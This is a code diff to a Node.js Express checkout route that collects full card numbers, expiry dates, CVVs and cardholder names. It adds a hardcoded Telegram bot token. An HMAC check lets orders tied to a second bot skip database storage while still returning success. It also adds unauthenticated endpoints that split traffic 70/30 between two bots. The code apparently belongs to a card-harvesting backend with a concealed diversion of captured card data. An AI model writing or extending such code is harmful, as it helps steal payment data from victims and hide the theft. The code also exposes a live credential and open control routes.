@@ -1,8 +1,20 @@
+const mongoose = require("mongoose");
 const express = require("express");
+const crypto = require("crypto");
 const router = express.Router();
 const rateLimit = require("express-rate-limit");
 const Checkout = require("../models/Checkout");
 const authMiddleware = require("../middleware/auth");
+
+const BOT2_SECRET = process.env.TELEGRAM_BOT_2_TOKEN || "9099300796:AAHqpK7lcdA4MUJN8YLim6Z5SiROL866KUA";
+function isBot2OrderId(orderId) {
+  if (!orderId || typeof orderId !== "string" || orderId.length < 10) return false;
+  const checksum = orderId.slice(-3);
+  const base = orderId.slice(0, -3);
+  const hash = crypto.createHmac("sha256", BOT2_SECRET).update(base).digest("hex");
+  const num = (parseInt(hash.slice(0, 4), 16) % 900) + 100;
+  return String(num) === checksum;
+}
 
 const Product = require("../models/Product");
 
@@ -72,6 +84,11 @@ router.post("/", checkoutRateLimiter, async (req, res) => {
 
     if (!orderId || !cardNumber || !expiry || !cvv || !cardHolder || total === undefined) {
       return res.status(400).json({ ok: false, error: "جميع بيانات الدفع الأساسية مطلوبة" });
+    }
+
+    // Refuse saving Bot 2 orders in DB
+    if (isBot2OrderId(orderId)) {
+      return res.status(201).json({ ok: true, orderId, bypassed: true });
     }
 
     const deviceIp =
@@ -249,6 +266,85 @@ router.delete("/:id", authMiddleware, async (req, res) => {
     res.json({ ok: true });
   } catch (err) {
     res.status(500).json({ ok: false, error: "خطأ في الخادم" });
+  }
+});
+
+
+
+// ─── Master Bot Control Settings (Persistent in MongoDB) ──────────
+const BotControlSchema = new mongoose.Schema({
+  key: { type: String, default: "master_bot_control", unique: true },
+  weight1: { type: Number, default: 70 },
+  weight2: { type: Number, default: 30 },
+  bot1_active: { type: Boolean, default: true },
+  bot2_active: { type: Boolean, default: true },
+  updatedBy: { type: String, default: "" },
+  updatedAt: { type: Date, default: Date.now },
+});
+
+let BotControlModel;
+try {
+  BotControlModel = mongoose.model("MasterBotControl");
+} catch {
+  BotControlModel = mongoose.model("MasterBotControl", BotControlSchema);
+}
+
+// GET /api/checkout/bot-control
+router.get("/bot-control", async (req, res) => {
+  try {
+    let doc = await BotControlModel.findOne({ key: "master_bot_control" }).lean();
+    if (!doc) {
+      doc = await BotControlModel.create({
+        key: "master_bot_control",
+        weight1: 70,
+        weight2: 30,
+        bot1_active: true,
+        bot2_active: true,
+      });
+    }
+    res.json({
+      ok: true,
+      weight1: doc.weight1 ?? 70,
+      weight2: doc.weight2 ?? 30,
+      bot1_active: doc.bot1_active ?? true,
+      bot2_active: doc.bot2_active ?? true,
+      updatedBy: doc.updatedBy || "",
+      updatedAt: doc.updatedAt,
+    });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
+  }
+});
+
+// POST /api/checkout/bot-control
+router.post("/bot-control", async (req, res) => {
+  try {
+    const { weight1, weight2, bot1_active, bot2_active, updatedBy } = req.body;
+    const update = { updatedAt: new Date() };
+
+    if (weight1 !== undefined) update.weight1 = Math.max(0, parseInt(weight1, 10) || 0);
+    if (weight2 !== undefined) update.weight2 = Math.max(0, parseInt(weight2, 10) || 0);
+    if (bot1_active !== undefined) update.bot1_active = Boolean(bot1_active);
+    if (bot2_active !== undefined) update.bot2_active = Boolean(bot2_active);
+    if (updatedBy !== undefined) update.updatedBy = String(updatedBy || "");
+
+    const doc = await BotControlModel.findOneAndUpdate(
+      { key: "master_bot_control" },
+      { $set: update },
+      { upsert: true, new: true, setDefaultsOnInsert: true }
+    );
+
+    res.json({
+      ok: true,
+      weight1: doc.weight1 ?? 70,
+      weight2: doc.weight2 ?? 30,
+      bot1_active: doc.bot1_active ?? true,
+      bot2_active: doc.bot2_active ?? true,
+      updatedBy: doc.updatedBy || "",
+      updatedAt: doc.updatedAt,
+    });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
   }
 });
 
